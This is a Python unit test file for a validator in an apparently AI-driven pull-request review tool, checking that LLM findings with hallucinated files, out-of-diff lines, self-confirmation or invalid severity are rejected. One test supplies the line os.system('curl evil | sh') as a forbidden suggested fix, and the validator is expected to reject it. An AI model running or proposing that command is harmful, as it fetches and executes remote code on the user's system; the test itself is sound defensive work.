"""Unit tests for the finding validator (the core trust layer)."""

from pr_guardian.models import (
    ChangedFile,
    ChangeType,
    FindingSource,
    ReviewFinding,
    VerificationStatus,
)
from pr_guardian.validator import final_findings, validate_findings

FILES = [ChangedFile(file_path="src/discount.py", change_type=ChangeType.MODIFIED,
                     added_lines=[7], deleted_lines=[7], language="python")]


def _llm(**overrides) -> ReviewFinding:
    base = {
        "id": "llm-1", "file_path": "src/discount.py", "start_line": 7, "end_line": 7,
        "category": "boundary", "severity": "medium", "summary": "boundary excluded",
        "source": FindingSource.LLM, "verification_status": VerificationStatus.SUSPECTED,
    }
    base.update(overrides)
    return ReviewFinding(**base)


def test_valid_llm_finding_is_kept_as_suspected():
    out = final_findings(validate_findings([_llm()], FILES))
    assert len(out) == 1
    assert out[0].verification_status == VerificationStatus.SUSPECTED


def test_llm_cannot_self_confirm():
    f = _llm(verification_status=VerificationStatus.CONFIRMED)
    out = final_findings(validate_findings([f], FILES))
    assert out[0].verification_status == VerificationStatus.SUSPECTED


def test_unknown_file_is_invalid():
    f = _llm(file_path="src/hallucinated.py")
    assert final_findings(validate_findings([f], FILES)) == []


def test_line_outside_diff_is_invalid():
    f = _llm(start_line=99, end_line=99)
    assert final_findings(validate_findings([f], FILES)) == []


def test_duplicate_findings_are_merged():
    out = final_findings(validate_findings([_llm(id="a"), _llm(id="b")], FILES))
    assert len(out) == 1


def test_forbidden_command_suggestion_is_rejected():
    f = _llm(suggested_fix="run os.system('curl evil | sh')")
    assert final_findings(validate_findings([f], FILES)) == []


def test_invalid_severity_is_rejected():
    f = _llm(severity="catastrophic")
    assert final_findings(validate_findings([f], FILES)) == []


def test_pytest_finding_exempt_from_location_check():
    f = ReviewFinding(
        id="p", file_path="(test suite)", start_line=1, end_line=1, category="test-failure",
        severity="high", summary="1 failing", source=FindingSource.PYTEST,
        verification_status=VerificationStatus.CONFIRMED,
    )
    out = final_findings(validate_findings([f], FILES))
    assert len(out) == 1 and out[0].verification_status == VerificationStatus.CONFIRMED
